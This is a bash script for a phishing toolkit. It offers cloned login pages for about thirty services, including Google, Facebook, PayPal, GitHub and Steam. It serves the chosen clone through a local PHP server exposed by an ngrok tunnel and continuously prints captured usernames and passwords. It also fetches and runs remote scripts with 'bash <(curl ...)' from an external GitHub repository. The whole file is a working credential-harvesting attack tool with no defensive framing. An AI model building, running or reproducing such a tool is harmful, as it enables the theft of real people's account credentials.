#!/bin/bash

__return__ () {
source __return__ &> /dev/null
if [[ ! $? == 105 ]]
then
printf 105
fi
}

__return__=$(printf "$(__return__)")

WAIT() {
sleep 0.01
}


OS=$(uname -o | grep -o "Android")
RANDOMs=$(shuf -i 1-4 -n 1)
CWD=$(pwd)
WEBPAGE=30
VAR=1.1
NUM=1

if [[ $OS == *'Android'* ]];then
TMPDIR=/data/data/com.termux/files/usr/tmp
else
TMPDIR=/tmp
fi

C0="\e[90m"
C1="\e[91m"
C2="\e[93m"
C3="\e[92m"
C4="\e[94m"
C5="\e[95m"
C6="\e[96m"
C7="\e[97m"
R0="\e[0m"
R1="\e[1m"
R2="\e[2m"
R3="\e[3m"
R4="\e[4m"
R5="\e[5m"
T1="["
T2="]"

declare -a SITES=(
Google
Facebook
Microsoft
Instagram
DeviantArt
Pinterest
Badoo
Twitch
Snapchat
Origin
Ebay
Linkedin
DropBox
Netflix
Mediafire
Gitlab
Github
Yahoo
Paypal
Quora
Wordpress
Steam
Protonmail
Yandex
Twitter
Spotify
StackoverFlow
Playstation
Reddit
Tiktok
Adobe
XBOX
Vk
)

if ! hash svn &> /dev/null
then
apt install subversion -y
elif ! hash php &> /dev/null
then
apt install php -y
elif ! hash curl &> /dev/null
then
apt install curl -y
fi

interrupt () {
exit_on_signal_SIGINT () {
if [[ ! $__return__ == 105 ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
echo
exit 0
else
echo
exit 0
fi
}

exit_on_signal_SIGTSTP () {
if [[ ! $__return__ == 105 ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
echo
exit 0
else
echo
exit 0
fi
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTSTP SIGTSTP
}

if [[ ! $__return__ == 105 ]];then
bash assets/logos/logo-0${RANDOMs}
else
bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/assets/logos/logo-0${RANDOMs}")
fi

printf "+ -- --=[ psfconsole pre-release v${VAR}  ]=-- -- +\n";WAIT
printf "+ -- --=[ ${WEBPAGE} webpage - templates       ]=-- -- +\n";WAIT

echo
for i in {0..8}
  do
  printf "${C4}(${R0}0$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done

for i in {9..29}
  do
  printf "${C4}(${R0}$((i+1))${C4})${R0} ${SITES[i]}\n"
  WAIT
done
echo

printf "${R4}psf${R0} > "
read input
interrupt

credentials() {
user=$(grep -o 'Username:.*' usernames.txt | awk NR==1 | cut -d " " -f2)
pass=$(grep -o 'Pass:.*' usernames.txt | awk NR==1 | cut -d ":" -f2)

if [[ ! ${#user} == 0 ]]
then
echo -e "Username : ${user}"
fi

if [[ ! ${#pass} == 0 ]]
then
if [[ ! ${pass} == " " ]]
then
echo -e "Password :${pass}\n"
fi
fi
rm usernames.txt &> /dev/null
}

if [[ ! $__return__ == 105 ]];then
if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]];then
if [[ ${input} -lt 30 ]]
  then
cd server
SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd ..
bash programs/ngrok.installer
bash programs/ngrok.configure
cp -rf  "${CWD}"/websites/"${SITES[${input} -1]}" "${CWD}/server"
cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}"
cd "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}"
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n\e[94m(\e[0m>\e[94m)\e[0m Credentials details visible here !"

while true
do
if [ -f "usernames.txt" ]
then
credentials
fi
done
fi
fi
else
if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]];then
if [[ ${input} -lt 30 ]]
  then
cd $TMPDIR
if [ ! -d "$TMPDIR/server" ]
then
mkdir server
fi
cd server
if [[ ! -d "${SITES[${input} -1]}" ]]
then
printf "\e[94m(\e[0m>\e[94m)\e[0m Downloading webpage template...\r"
svn checkout https://github.com/abhackerofficial/phising-framework/trunk/websites/"${SITES[${input} -1]}" &> /dev/null
fi
SCRIPT_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd ..
cd server/"${SITES[${input} -1]}"
printf "\e[94m(\e[0m>\e[94m)\e[0m Downloading additional Program for Starting server...\r"
curl -sLO https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/server/ip.php
cd - &> /dev/null
bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.installer")
bash <(curl -sL "https://raw.githubusercontent.com/abhackerofficial/phising-framework/master/programs/ngrok.configure")
cd server/"${SITES[${input} -1]}"
php -S localhost:8080 > /dev/null 2>&1 &
echo -e "\n\e[94m(\e[0m>\e[94m)\e[0m Credentials details visible here !"

while true
do
if [ -f "usernames.txt" ]
then
credentials
fi
done
fi
fi
fi
